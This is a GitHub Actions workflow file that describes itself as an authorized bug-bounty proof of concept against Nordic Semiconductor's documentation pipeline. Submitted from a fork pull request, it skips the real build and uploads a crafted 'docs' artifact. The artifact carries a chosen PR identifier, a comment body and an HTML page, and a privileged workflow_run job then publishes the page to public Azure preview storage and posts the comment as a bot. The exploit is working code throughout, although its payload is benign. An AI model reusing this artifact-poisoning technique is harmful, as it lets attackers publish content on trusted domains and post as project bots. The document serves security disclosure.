name: Documentation Build

# PoC (Nordic Semiconductor bug bounty, authorized security research):
# This is an attacker-modified version of the "Documentation Build" workflow.
# For `pull_request` events GitHub Actions executes the workflow file version
# found in the PR's merge commit, so a fork PR can fully replace this file
# (the original file's own `paths:` filter includes this path). The job below
# skips the real documentation build and uploads a crafted `docs` artifact,
# which the privileged `Documentation Publish` (workflow_run) workflow then
# downloads and publishes to Nordic's public Azure doc-preview storage.

on:
  pull_request:
    types: [opened, synchronize, reopened]
    branches:
      - main
    paths:
      - '.github/workflows/docbuild.yml'

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: PoC notice
        run: |
          echo "PoC artifact poisoning: this run is attacker-controlled (fork PR, no trusted labels)."
          echo "It uploads a crafted 'docs' artifact consumed by docpublish.yml (workflow_run)."

      - name: Craft artifact contents
        run: |
          mkdir -p docs site

          # Consumed by docpublish step 'Unzip html archive':
          #   OUTDIR=ncs/$(awk 'NR==1 { if ($3 ~ /^(latest|PR-[0-9]+|[0-9]+\.[0-9a-zA-Z.-]+)$/) print $3 }' monitor_*.txt)
          # $3 is fully attacker-controlled and may be ANY PR number (or version).
          # PR-999901 chosen because no PR with that number exists (no one's preview is affected).
          echo "publish2 dev PR-999901 legacy-ncs-pr-999901.zip" > "docs/monitor_${GITHUB_RUN_ID}.txt"

          # Consumed by docpublish 'Obtain PR number' -> posted as a github-actions[bot]
          # comment with fully attacker-controlled body on the chosen PR.
          echo "${{ github.event.pull_request.number }}" > docs/pr.txt

          cat > docs/comment.txt <<'EOF'
          You can find the documentation preview for this PR [here](https://ncsbmdoc.z6.web.core.windows.net/ncs/PR-999901/).

          **[PoC - Nordic bug bounty]** This comment and the content at PR-999901 were published
          from an attacker-controlled `docs` artifact without any trusted label. The PR number in
          `monitor_*.txt` and this comment body are arbitrary. Benign PoC, will be retracted.
          EOF

          cat > site/index.html <<'EOF'
          <!doctype html>
          <html>
          <head><meta charset="utf-8"><meta name="robots" content="noindex">
          <title>PoC - Nordic bug bounty</title></head>
          <body>
            <h1>PoC: attacker-published content on Nordic doc-preview storage</h1>
            <p>This page was published to Nordic's public documentation-preview storage
            (ncsbmdoc.z6.web.core.windows.net) via the docbuild &rarr; docpublish
            (workflow_run) artifact chain, from a fork PR carrying no trusted labels.</p>
            <p>Benign proof of concept for the Nordic Semiconductor bug bounty program.
            Published under PR-999901 (a non-existent PR number) to avoid affecting
            any real preview.</p>
          </body>
          </html>
          EOF

          (cd site && zip -rq "../docs/legacy-ncs-pr-999901.zip" .)

      - name: Upload crafted docs artifact
        uses: actions/upload-artifact@v4
        with:
          name: docs
          path: docs/
